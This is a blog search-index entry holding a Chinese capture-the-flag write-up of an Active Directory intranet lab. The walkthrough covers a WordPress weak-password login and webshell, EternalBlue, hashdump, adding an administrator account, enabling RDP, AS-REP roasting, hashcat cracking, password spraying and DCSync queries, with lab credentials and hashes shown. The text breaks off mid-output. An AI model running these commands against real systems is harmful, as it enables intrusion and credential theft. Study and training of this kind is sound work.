<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>春秋云镜-2022第三届网鼎杯半决</title>
      <link href="/2025/01/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3/"/>
      <url>/2025/01/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3/</url>
      
        <content type="html"><![CDATA[<blockquote><p>该靶场为 2022 第三届网鼎杯决赛内网靶场复盘。完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有 4 个 flag，分布于不同的靶机</p></blockquote><ul><li>Wordpress</li><li>内网渗透</li><li>域渗透</li><li>Kerberos</li><li>AD CS<br><img src="/Rxi134_FILE/9413e66ce78560bb2ba13b43acdc5def_MD5.jpeg"></li></ul><h1 id="外网边界"><a href="#外网边界" class="headerlink" title="外网边界"></a>外网边界</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p><img src="/Rxi134_FILE/4833fb5d719e8a5d43f3a8a79f9fc202_MD5.jpeg"></p><p>wordpress CMS<br><img src="/Rxi134_FILE/e98aad79491ddca060c8bc53f5254d2b_MD5.jpeg"></p><p>goby扫下端口，顺便打些常见poc<br><img src="/Rxi134_FILE/b3a4ae98dc416dcb4354967ae4c02b9b_MD5.jpeg"><br>看了是要从wordpress入手了</p><p>wp cms漏洞几乎都在后台，所以第一步得肯定先登录</p><p>wpscan枚举用户名<br><img src="/Rxi134_FILE/6173f98f69929150853d1047d43051f0_MD5.jpeg"></p><p>默认情况下 WordPress 后台登录界面在 <code>/wp-login.php</code>下<br><img src="/Rxi134_FILE/794601caf42b0b30fcf1b5227932b87d_MD5.jpeg"></p><p>admin用户名是存在的<br><img src="/Rxi134_FILE/27c534e85ad5aaed93065087ef7e86fd_MD5.jpeg"></p><h2 id="wp弱口令-后台模板写入webshell"><a href="#wp弱口令-后台模板写入webshell" class="headerlink" title="wp弱口令+后台模板写入webshell"></a>wp弱口令+后台模板写入webshell</h2><p>admin:123456 直接就进去了<br><img src="/Rxi134_FILE/46b5e2bf0582fc6a4fc6d86de5d798db_MD5.jpeg"></p><p>直奔后台模板，向其写入webshell<br><img src="/Rxi134_FILE/07ea44861514bbb57f25911a36710969_MD5.jpeg"></p><p>连接webshell，主题名为 twentytwentyone<br><img src="/Rxi134_FILE/0c1700c6f926e90465dcd0eb3f4a4d7f_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">http://&lt;IP>/wp-content/themes/twentytwentyone/404.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/332cab396b795a573acf9d924989ff42_MD5.jpeg"></p><h2 id="获取flag01"><a href="#获取flag01" class="headerlink" title="获取flag01"></a>获取flag01</h2><p>在根目录直接就能cat flag，看来没必要提权了<br><img src="/Rxi134_FILE/9076a28edb5db8688a1334ab9ad31e91_MD5.jpeg"></p><h2 id="获取数据库密码"><a href="#获取数据库密码" class="headerlink" title="获取数据库密码"></a>获取数据库密码</h2><p>翻翻wp cms的配置文件，位置在<code>/var/www/html/wp-config.php</code></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">// ** Database settings - You can get this info from your web host ** ///** The name of the database for WordPress */define( 'DB_NAME', 'wordpress' );/** Database username */define( 'DB_USER', 'root' );/** Database password */define( 'DB_PASSWORD', 'Root@O4oLkum3' );/** Database hostname */define( 'DB_HOST', 'localhost' );/** Database charset to use in creating database tables. */define( 'DB_CHARSET', 'utf8mb4' );/** The database collate type. Don't change this if in doubt. */define( 'DB_COLLATE', '' );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>尝试去ssh连接，提示需要密钥登录<br><img src="/Rxi134_FILE/2d14cb61c01f4b178ef973683d15735f_MD5.jpeg"></p><p>似乎并没有什么密钥<br><img src="/Rxi134_FILE/13bacaa0861d463313c52ae0875a3c90_MD5.jpeg"></p><h2 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h2><p>我就直接开个端口正连了<br><img src="/Rxi134_FILE/b130f3f2a4d89f000222ecd749fad4fe_MD5.jpeg"></p><p>可以利用python起一个伪终端<br><img src="/Rxi134_FILE/ae12d3eda96d34af7b538f640491e490_MD5.jpeg"></p><h2 id="搭建socks代理"><a href="#搭建socks代理" class="headerlink" title="搭建socks代理"></a>搭建socks代理</h2><p>chisel<br><img src="/Rxi134_FILE/ef55ddbf086e27ff00f5f2ae04ff6f87_MD5.jpeg"></p><h1 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h1><p>内网网段为 172.22.15.0&#x2F;24，该web机内网ip为 172.22.15.26</p><h2 id="fscan内网大保健"><a href="#fscan内网大保健" class="headerlink" title="fscan内网大保健"></a>fscan内网大保健</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">start infoscantrying RunIcmp2The current user permissions unable to send icmp packetsstart ping(icmp) Target 172.22.15.24    is alive(icmp) Target 172.22.15.26    is alive(icmp) Target 172.22.15.35    is alive(icmp) Target 172.22.15.18    is alive(icmp) Target 172.22.15.13    is alive[*] Icmp alive hosts len is: 5172.22.15.13:445 open172.22.15.18:445 open172.22.15.35:445 open172.22.15.24:445 open172.22.15.13:139 open172.22.15.18:139 open172.22.15.35:139 open172.22.15.24:139 open172.22.15.13:135 open172.22.15.18:135 open172.22.15.35:135 open172.22.15.24:135 open172.22.15.13:88 open172.22.15.18:80 open172.22.15.24:80 open172.22.15.26:80 open172.22.15.24:3306 open172.22.15.26:22 open[*] alive ports len is: 18start vulscan[*] NetInfo [*]172.22.15.13   [->]XR-DC01   [->]172.22.15.13[*] NetInfo [*]172.22.15.18   [->]XR-CA   [->]172.22.15.18[*] NetInfo [*]172.22.15.24   [->]XR-WIN08   [->]172.22.15.24[*] NetBios 172.22.15.13    [+] DC:XR-DC01.xiaorang.lab          Windows Server 2016 Standard 14393[*] NetInfo [*]172.22.15.35   [->]XR-0687   [->]172.22.15.35[+] MS17-010 172.22.15.24(Windows Server 2008 R2 Enterprise 7601 Service Pack 1)[*] OsInfo 172.22.15.13(Windows Server 2016 Standard 14393)[*] NetBios 172.22.15.18    XR-CA.xiaorang.lab                  Windows Server 2016 Standard 14393[*] NetBios 172.22.15.24    WORKGROUP\XR-WIN08                  Windows Server 2008 R2 Enterprise 7601 Service Pack 1[*] NetBios 172.22.15.35    XIAORANG\XR-0687              [*] WebTitle http://172.22.15.26       code:200 len:39962  title:XIAORANG.LAB[*] WebTitle http://172.22.15.18       code:200 len:703    title:IIS Windows Server[*] WebTitle http://172.22.15.24       code:302 len:0      title:None 跳转url: http://172.22.15.24/www[+] PocScan http://172.22.15.18 poc-yaml-active-directory-certsrv-detect [*] WebTitle http://172.22.15.24/www/sys/index.php code:200 len:135    title:None已完成 18/18[*] 扫描结束,耗时: 13.710814675s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>域名 xiaorang.lab<br><img src="/Rxi134_FILE/8b3f32c2be226753b8ae9ccabffe6a5b_MD5.jpeg"></p><p>扫出个永恒之蓝</p><h2 id="永恒之蓝拿下-172-22-15-24-XR-WIN08"><a href="#永恒之蓝拿下-172-22-15-24-XR-WIN08" class="headerlink" title="永恒之蓝拿下 172.22.15.24 XR-WIN08"></a>永恒之蓝拿下 172.22.15.24 XR-WIN08</h2><p>msf+setg直接拿下，真不错<br><img src="/Rxi134_FILE/60eee33f692fd7e97500c22bf16c3e1b_MD5.jpeg"></p><h3 id="获取flag02"><a href="#获取flag02" class="headerlink" title="获取flag02"></a>获取flag02</h3><p><img src="/Rxi134_FILE/49b6d2ee5e8dbcd8421616ce091361e2_MD5.jpeg"></p><h3 id="域信息搜集"><a href="#域信息搜集" class="headerlink" title="域信息搜集"></a>域信息搜集</h3><p>systeminfo</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Host Name:                 XR-WIN08OS Name:                   Microsoft Windows Server 2008 R2 Enterprise OS Version:                6.1.7601 Service Pack 1 Build 7601OS Manufacturer:           Microsoft CorporationOS Configuration:          Standalone ServerOS Build Type:             Multiprocessor FreeRegistered Owner:          Registered Organization:   AliyunProduct ID:                00486-001-0001076-84509Original Install Date:     2023/2/1, 12:24:48System Boot Time:          2024/11/17, 22:04:31System Manufacturer:       Alibaba CloudSystem Model:              Alibaba Cloud ECSSystem Type:               x64-based PCProcessor(s):              1 Processor(s) Installed.                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2500 MhzBIOS Version:              SeaBIOS 449e491, 2014/4/1Windows Directory:         C:\WindowsSystem Directory:          C:\Windows\system32Boot Device:               \Device\HarddiskVolume1System Locale:             zh-cn;Chinese (China)Input Locale:              zh-cn;Chinese (China)Time Zone:                 (UTC+08:00) Beijing, Chongqing, Hong Kong, UrumqiTotal Physical Memory:     3,950 MBAvailable Physical Memory: 3,051 MBVirtual Memory: Max Size:  3,948 MBVirtual Memory: Available: 2,966 MBVirtual Memory: In Use:    982 MBPage File Location(s):     N/ADomain:                    WORKGROUPLogon Server:              N/AHotfix(s):                 57 Hotfix(s) Installed.                           [01]: KB981391                           [02]: KB981392                           [03]: KB977236                           [04]: KB981111                           [05]: KB977238                           [06]: KB2849697                           [07]: KB2849696                           [08]: KB2841134                           [09]: KB2841134                           [10]: KB977239                           [11]: KB2670838                           [12]: KB2830477                           [13]: KB2592687                           [14]: KB3191566                           [15]: KB981390                           [16]: KB2386667                           [17]: KB2533623                           [18]: KB2545698                           [19]: KB2547666                           [20]: KB2574819                           [21]: KB2603229                           [22]: KB2639308                           [23]: KB2685811                           [24]: KB2685813                           [25]: KB2729094                           [26]: KB2731771                           [27]: KB2732059                           [28]: KB2750841                           [29]: KB2761217                           [30]: KB2786081                           [31]: KB2809215                           [32]: KB2834140                           [33]: KB2872035                           [34]: KB2882822                           [35]: KB2888049                           [36]: KB2919469                           [37]: KB2923545                           [38]: KB2970228                           [39]: KB3006137                           [40]: KB3018238                           [41]: KB3020369                           [42]: KB3054205                           [43]: KB3068708                           [44]: KB3080149                           [45]: KB3102429                           [46]: KB3125574                           [47]: KB3138612                           [48]: KB3140245                           [49]: KB3172605                           [50]: KB3179573                           [51]: KB3210131                           [52]: KB4019990                           [53]: KB4040980                           [54]: KB4490628                           [55]: KB4532945                           [56]: KB4536952                           [57]: KB976902Network Card(s):           1 NIC(s) Installed.                           [01]: Red Hat VirtIO Ethernet Adapter                                 Connection Name: 本地连接 2                                 DHCP Enabled:    Yes                                 DHCP Server:     172.22.255.253                                 IP address(es)                                 [01]: 172.22.15.24                                 [02]: fe80::e186:a97a:c358:7284<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>WORKGROUP，只是个工作组的机子…</p><h3 id="密码抓取-hashdump（失败）"><a href="#密码抓取-hashdump（失败）" class="headerlink" title="密码抓取 &amp; hashdump（失败）"></a>密码抓取 &amp; hashdump（失败）</h3><p>导入kiwi模块，p都抓不出来<br><img src="/Rxi134_FILE/aa1edcb63963108aa15d47bc2a3b18eb_MD5.jpeg"></p><p>dump 出 hash，好像也没什么用</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">meterpreter > hashdumpAdministrator:500:aad3b435b51404eeaad3b435b51404ee:0e52d03e9b939997401466a0ec5a9cbc:::        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                 hacker:1001:aad3b435b51404eeaad3b435b51404ee:94994b74f29662fc4d702f2f3b0df327:::  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>也没有其它用户<br><img src="/Rxi134_FILE/2828ccbfeac974b2e44552d3f6d15330_MD5.jpeg"></p><h3 id="远程桌面（失败）"><a href="#远程桌面（失败）" class="headerlink" title="远程桌面（失败）"></a>远程桌面（失败）</h3><p>添加新用户</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">net user hacker P@assword &#x2F;addnet user hacker &#x2F;active:yesnet localgroup administrators hacker &#x2F;add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>开放防火墙端口</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>挂全局代理mstc上去，？<br><img src="/Rxi134_FILE/cab37ebe925ed35ac6bd33c957988736_MD5.jpeg"></p><h3 id="寻找突破点"><a href="#寻找突破点" class="headerlink" title="寻找突破点"></a>寻找突破点</h3><h4 id="可用信息搜集"><a href="#可用信息搜集" class="headerlink" title="可用信息搜集"></a>可用信息搜集</h4><p>本机80端口还有个网站，是一个OA系统<br><img src="/Rxi134_FILE/7be8a60bff3e705de240d6a181dc7558_MD5.jpeg"></p><p>是用phpstudy搭的，直接把所有源码下载下来看看</p><p>试试弱口令，admin:123456又进去了<br><img src="/Rxi134_FILE/e4b617065cb7c2fd29307a6d8eeb36b2_MD5.jpeg"><br>不过啥都没有</p><p>翻翻配置文件，在<code>C:\phpstudy_pro\WWW\config</code>下有一些可疑文件，下载下来审计<br><img src="/Rxi134_FILE/3df9667d8921108277e14fa30189a17e_MD5.jpeg"></p><p>还真找到东西了，my.php里有mysql的账密</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">&lt;?php$config->installed    = true;$config->debug        = false;$config->requestType  = 'GET';$config->db->host     = '127.0.0.1';$config->db->port     = '3306';$config->db->name     = 'zdoo';$config->db->user     = 'root';$config->db->password = 'root@#123';$config->db->prefix   = 'zdoo';<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>远程连接看看<br><img src="/Rxi134_FILE/555466d2d8d21e13d5f83bfe1a5ff854_MD5.jpeg"></p><p>在 zoodsys_user找到一些信息</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">adminlixiuyinglixiaoliangzhangyijiaxiaoliangzhanglizhangweiliuqiangwangfangwangweiwanglihonghuachunmeiwanghaozhangxinyuhuzhiganglihongxiawangyulanchenjianhualixiuying@xiaorang.lablixiaoliang@xiaorang.labzhangyi@xiaorang.labjiaxiaoliang@xiaorang.labzhangli@xiaorang.labzhangwei@xiaorang.labliuqiang@xiaorang.labwangfang@xiaorang.labwangwei@xiaorang.labwanglihong@xiaorang.labhuachunmei@xiaorang.labwanghao@xiaorang.labzhangxinyu@xiaorang.labhuzhigang@xiaorang.lablihongxia@xiaorang.labwangyulan@xiaorang.labchenjianhua@xiaorang.lab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>哎，这后面跟个 @xiaorang.lab 很可疑，这不是标准的域用户名格式吗</p><p>整理成 username.txt 为后续喷洒作准备</p><h4 id="域内用户名枚举"><a href="#域内用户名枚举" class="headerlink" title="域内用户名枚举"></a>域内用户名枚举</h4><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">kerbrute_windows_amd64.exe userenum -d xiaorang.lab C:\Users\Anonymous\Desktop\username.txt --dc 172.22.15.13<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/a5a8e6b365056637877a05245bccb780_MD5.jpeg"></p><p>可用域用户有四个</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">lixiuying@xiaorang.lablihongxia@xiaorang.labhuachunmei@xiaorang.labchenjianhua@xiaorang.lab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="asrep-roasting"><a href="#asrep-roasting" class="headerlink" title="asrep roasting"></a>asrep roasting</h4><p>梳理一下现在已有的东西：</p><ol><li>我们在域外</li><li>我们现在有域用户名</li></ol><p>那就很明了了，直奔看看有没有用户关闭了预认证</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">C:\Penetration\IntranetTools\imPacket\impacket-linux\examples>python GetNPUsers.py -usersfile C:\Users\Anonymous\Desktop\true_username.txt -format john -dc-ip 172.22.15.13 xiaorang.lab/Impacket v0.11.0 - Copyright 2023 Fortra$krb5asrep$lixiuying@xiaorang.lab@XIAORANG.LAB:4f72370e5984a9cc5caff93b80bcf7a5$dc3a5d5e33684241c3282d91b81c43aaeba6c7aa0df810c912d04f39df97b790a5c229d8d7e0f718f558f64f9e0bf92cba674b633c6fa8a549c8afbc6fb58889fb5610f340199b7c1e5c469b3598fb0c6e9915ef4388c11f085934b50e0d130338b4d2f4a7cf8ad0ac18d7e7ca6493860ac44cae56cbc9263d6fa2d8c2389c3d50d001cb634d65eacb706faa6e431f185a22bfe5593daa947bce68593f514b373b1473afd9d654b7f13ba559d7cb1a92c5c9bad2e162d3b46b5560ccd5ff2e09e1a724c5a945dc2d8d574352546ae2ed48e1f2487a0e72a380fd4c1623f9df9fc8a4a7ff072527410af73db2[-] User lihongxia@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set$krb5asrep$huachunmei@xiaorang.lab@XIAORANG.LAB:14b2f48e289f2bc4e69e361090220769$f385b8fba5587821ece1dc7b8922aafff018e976f30f147e65755046ecc1e254dbf675a9631e94f35b458d2abade2a611b4bd817f82d16257f7af18a72ee10bd3457269bf6b13fd451f170a60d49091636e7d26d0b7e1e415c3b4517769916d4785ff007934be5db65ddb9dcf3092b4ef2d3137ef34865f4b568ba59501d1989492343e7ec5f69c214d8a8df5ca3e628c58d3b494f20f90564840e9c6be0e9118b77b123abe4dc0202479c7db4ef50638c08c55c95aa10d2f41ea9b1ec7068bc8cd13e640169a22ec333a0d1ea65ac7cb2e0407a389ba6e8445d46c40a9a8c4ca84f596c714839040eca458f[-] User chenjianhua@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>破解 logon session key，字典选用 rockyou</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hashcat.exe <span class="token parameter variable">-m</span> <span class="token number">18200</span> C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span><span class="token number">19085</span><span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>hash1.hash C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span><span class="token number">19085</span><span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>wordlists<span class="token punctuation">\</span>rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/bdcb1c278bf434fd2b753e3e4fd92b1f_MD5.jpeg"></p><p>秒破</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">lixiuying@xiaorang.lab:winniethepoohhuachunmei@xiaorang.lab:1qaz2wsx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="拿下-172-22-15-35-XR-0687"><a href="#拿下-172-22-15-35-XR-0687" class="headerlink" title="拿下 172.22.15.35 XR-0687"></a>拿下 172.22.15.35 XR-0687</h2><p>有了两组凭据，首先肯定是要来喷洒一波了</p><p>整理一下用户名和密码，把administrator也添上去碰碰运气：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">lixiuyinghuachunmeiadministrator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">winniethepooh1qaz2wsx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h3><p>先找rdp、winrm这种能直接远控的协议</p><p>172.22.15.35 172.22.15.18 172.22.15.13</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains netexec rdp <span class="token number">172.22</span>.15.35 <span class="token number">172.22</span>.15.18 <span class="token number">172.22</span>.15.13 <span class="token parameter variable">-u</span> ./username.txt <span class="token parameter variable">-p</span> ./password.txt <span class="token parameter variable">--continue</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/c99a00423fb5645fb03568e215a671f6_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">172.22.15.35    3389   XR-0687          [+] xiaorang.lab\lixiuying:winniethepooh (Pwn3d!)172.22.15.35    3389   XR-0687          [+] xiaorang.lab\huachunmei:1qaz2wsx (Pwn3d!)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a>远程桌面</h3><p>利用proxyfier<br><img src="/Rxi134_FILE/715dd5500579b22671c61353ca671afe_MD5.jpeg"></p><p>成功连接<br><img src="/Rxi134_FILE/61942a5d9999e5d99dcedf2b1d21fa0f_MD5.jpeg"><br>但是没找到flag</p><p>顺带连下证书机和域控，果然都不行<br><img src="/Rxi134_FILE/e7e226c037add55d66bbdaeb1dfd781a_MD5.jpeg"></p><h3 id="winpeas"><a href="#winpeas" class="headerlink" title="winpeas"></a>winpeas</h3><p>上传枚举一波信息，没有找到什么东西</p><h3 id="域信息搜集-1"><a href="#域信息搜集-1" class="headerlink" title="域信息搜集"></a>域信息搜集</h3><p>现在咱们终于到域里面了</p><ul><li><p>whoami<br><img src="/Rxi134_FILE/ec61791b360839bcabece58150969963_MD5.jpeg"></p></li><li><p>域用户<br><img src="/Rxi134_FILE/35980daf47ccb8fe4da3f8ba73b120e5_MD5.jpeg"></p></li><li><p>域组<br>我们权限太低，看不到<br><img src="/Rxi134_FILE/1b1862c6e46de239bf1183806908dddd_MD5.jpeg"></p></li></ul><h3 id="ACL分析"><a href="#ACL分析" class="headerlink" title="ACL分析"></a>ACL分析</h3><h4 id="ADFind（失败）"><a href="#ADFind（失败）" class="headerlink" title="ADFind（失败）"></a>ADFind（失败）</h4><p>查一下这两个用户对域内对象的ACL：lixiuying、huachunmei</p><p>先找下dcsync，过滤下sddl</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>lixiuying<span class="token punctuation">\</span>Desktop<span class="token operator">></span>Adfind.exe <span class="token parameter variable">-s</span> subtree <span class="token parameter variable">-b</span> <span class="token string">"DC=xiaorang,DC=lab"</span> <span class="token parameter variable">-sdna</span> nTSecurityDescriptor -sddl+++ <span class="token parameter variable">-sddlfilter</span> <span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token string">"Replicating Directory Changes"</span><span class="token punctuation">;</span><span class="token punctuation">;</span> <span class="token parameter variable">-recmute</span> <span class="token parameter variable">-resolvesids</span>AdFind V01.62.00cpp Joe Richards <span class="token punctuation">(</span>support@joeware.net<span class="token punctuation">)</span> October <span class="token number">2023</span>Using server: XR-DC01.xiaorang.lab:389Directory: Windows Server <span class="token number">2016</span>dn:DC<span class="token operator">=</span>xiaorang,DC<span class="token operator">=</span>lab<span class="token operator">></span>nTSecurityDescriptor: <span class="token punctuation">[</span>DACL<span class="token punctuation">]</span> OBJ ALLOW<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">[</span>CTL<span class="token punctuation">]</span><span class="token punctuation">;</span>Replicating Directory Changes<span class="token punctuation">;</span><span class="token punctuation">;</span>XIAORANG<span class="token punctuation">\</span>Enterprise Read-only Domain Controllers<span class="token operator">></span>nTSecurityDescriptor: <span class="token punctuation">[</span>DACL<span class="token punctuation">]</span> OBJ ALLOW<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">[</span>CTL<span class="token punctuation">]</span><span class="token punctuation">;</span>Replicating Directory Changes All<span class="token punctuation">;</span><span class="token punctuation">;</span>XIAORANG<span class="token punctuation">\</span>Domain Controllers<span class="token operator">></span>nTSecurityDescriptor: <span class="token punctuation">[</span>DACL<span class="token punctuation">]</span> OBJ ALLOW<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">[</span>CTL<span class="token punctuation">]</span><span class="token punctuation">;</span>Replicating Directory Changes In Filtered Set<span class="token punctuation">;</span><span class="token punctuation">;</span>BUILTIN<span class="token punctuation">\</span>Administrators<span class="token operator">></span>nTSecurityDescriptor: <span class="token punctuation">[</span>DACL<span class="token punctuation">]</span> OBJ ALLOW<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">[</span>CTL<span class="token punctuation">]</span><span class="token punctuation">;</span>Replicating Directory Changes<span class="token punctuation">;</span><span class="token punctuation">;</span>BUILTIN<span class="token punctuation">\</span>Administrators<span class="token operator">></span>nTSecurityDescriptor: <span class="token punctuation">[</span>DACL<span class="token punctuation">]</span> OBJ ALLOW<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">[</span>CTL<span class="token punctuation">]</span><span class="token punctuation">;</span>Replicating Directory Changes All<span class="token punctuation">;</span><span class="token punctuation">;</span>BUILTIN<span class="token punctuation">\</span>Administrators<span class="token operator">></span>nTSecurityDescriptor: <span class="token punctuation">[</span>DACL<span class="token punctuation">]</span> OBJ ALLOW<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">[</span>CTL<span class="token punctuation">]</span><span class="token punctuation">;</span>Replicating Directory Changes In Filtered Set<span class="token punctuation">;</span><span class="token punctuation">;</span>NT AUTHORITY<span class="token punctuation">\</span>ENTERPRISE DOMAIN CONTROLLERS<span class="token operator">></span>nTSecurityDescriptor: <span class="token punctuation">[</span>DACL<span class="token punctuation">]</span> OBJ ALLOW<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">[</span>CTL<span class="token punctuation">]</span><span class="token punctuation">;</span>Replicating Directory Changes<span class="token punctuation">;</span><span class="token punctuation">;</span>NT AUTHORITY<span class="token punctuation">\</span>ENTERPRISE DOMAIN CONTROLLERSdn:CN<span class="token operator">=</span>Builtin,DC<span class="token operator">=</span>xiaorang,DC<span class="token operator">=</span>lab<span class="token operator">></span>nTSecurityDescriptor: <span class="token punctuation">[</span>DACL<span class="token punctuation">]</span> OBJ ALLOW<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">[</span>CTL<span class="token punctuation">]</span><span class="token punctuation">;</span>Replicating Directory Changes<span class="token punctuation">;</span><span class="token punctuation">;</span>XIAORANG<span class="token punctuation">\</span>Enterprise Read-only Domain Controllers<span class="token operator">></span>nTSecurityDescriptor: <span class="token punctuation">[</span>DACL<span class="token punctuation">]</span> OBJ ALLOW<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">[</span>CTL<span class="token punctuation">]</span><span class="token punctuation">;</span>Replicating Directory Changes All<span class="token punctuation">;</span><span class="token punctuation">;</span>XIAORANG<span class="token punctuation">\</span>Domain Controllers<span class="token operator">></span>nTSecurityDescriptor: <span class="token punctuation">[</span>DACL<span class="token punctuation">]</span> OBJ ALLOW<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">[</span>CTL<span class="token punctuation">]</span><span class="token punctuation">;</span>Replicating Directory Changes In Filtered Set<span class="token punctuation">;</span><span class="token punctuation">;</span>BUILTIN<span class="token punctuation">\</span>Administrators<span class="token operator">></span>nTSecurityDescriptor: <span class="token punctuation">[</span>DACL<span class="token punctuation">]</span> OBJ ALLOW<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">[</span>CTL<span class="token punctuation">]</span><span class="token punctuation">;</span>Replicating Directory Changes<span class="token punctuation">;</span><span class="token punctuation">;</span>BUILTIN<span class="token punctuation">\</span>Administrators<span class="token operator">></span>nTSecurityDescriptor: <span class="token punctuation">[</span>DACL<span class="token punctuation">]</span> OBJ ALLOW<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">[</span>CTL<span class="token 